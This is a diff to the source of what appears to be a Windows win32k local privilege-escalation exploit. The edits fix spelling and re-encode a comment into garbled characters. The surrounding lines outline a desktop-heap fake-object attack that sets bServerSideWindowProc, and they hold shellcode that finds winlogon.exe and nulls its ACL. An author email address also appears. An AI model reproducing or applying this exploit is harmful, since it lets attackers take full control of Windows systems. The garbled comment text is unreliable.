@@ -8,8 +8,8 @@ steps :
 
 1: hook PEB callback Function 
 2: trigger vulnerability ( make proper Window to lead vulnerable function)
-3: replace  fack object with NtUserDefSetText in Desktop heap inside PEB callback 
-4: fack object with save exit buffer(0x0c0c0c0c)  and pointer to tagWND 
+3: replace  fake object with NtUserDefSetText in Desktop heap inside PEB callback 
+4: fake object with save exit buffer(0x0c0c0c0c)  and pointer to tagWND 
 5: do it until bServerSideWindowProc is set 
 
 mail :   Firozimaysam@gmail.com 
@@ -194,7 +194,7 @@ __declspec(noinline) int Shellcode()
 		lea edx, [eax-0xb8] // KPROCESS
 		mov eax, [eax]
 		add edx, 0x16c // module name
-		cmp dword ptr [edx], 0x6c6e6977 // ìwinlî for winlogon.exe
+		cmp dword ptr [edx], 0x6c6e6977 // ‚Äúwinl‚Äù for winlogon.exe
 		jne procloop
 		sub edx, 0x170
 		mov dword ptr [edx], 0x0 // NULL ACL
